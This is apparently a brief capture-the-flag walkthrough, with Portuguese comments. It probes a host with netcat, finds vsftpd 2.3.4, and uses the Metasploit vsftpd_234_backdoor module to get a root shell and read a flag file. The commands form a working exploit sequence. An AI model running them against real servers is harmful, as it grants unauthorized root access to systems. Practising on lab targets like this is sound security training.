msfconsole
	nc 167.99.243.7 5031
        	(INFO) vSFTPd (2.3.4)
        
	//explorar o serviço vsftpd
	search vsftpd
                 Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


        use exploit/unix/ftp/vsftpd_234_backdoor
        show options
        set RHOSTS = 167.99.243.7
        set RPORT = 5031
        exploit
        
	// backdoor created (uid=0) root access level
        	ls
                flag.txt
                cat flag.txt
                TPAS{uma flag qualquer}      
